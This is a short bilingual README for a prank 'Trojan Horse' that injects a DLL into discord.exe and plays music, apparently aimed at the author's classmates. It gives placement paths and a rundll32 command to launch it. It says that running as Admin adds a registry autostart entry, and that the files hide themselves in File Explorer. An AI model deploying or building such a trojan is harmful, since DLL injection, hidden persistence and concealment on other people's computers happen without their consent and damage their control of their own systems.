# UM_Trojan_Horse

This is the ㄩㄇ Trojan Horse, will do the dll injection into discord.exe, and play the ㄩㄇ music.
目前只是為了惡搞同學，所以還沒有寫得很一般化，路徑也是寫死的。
## 用法
首先把 `bin/UM.dll` 和 `src/UM.wav` 放到 `C:\Users\User\Favorites` 底下，接下來執行:
```bash
rundll32 UM.dll,StartUM 
```
如果可以的話用 Admin 執行，這樣他會被寫進 regedit 裡面，開機自動啟動。
然後我他在檔案總管中有做隱藏，是看不見的。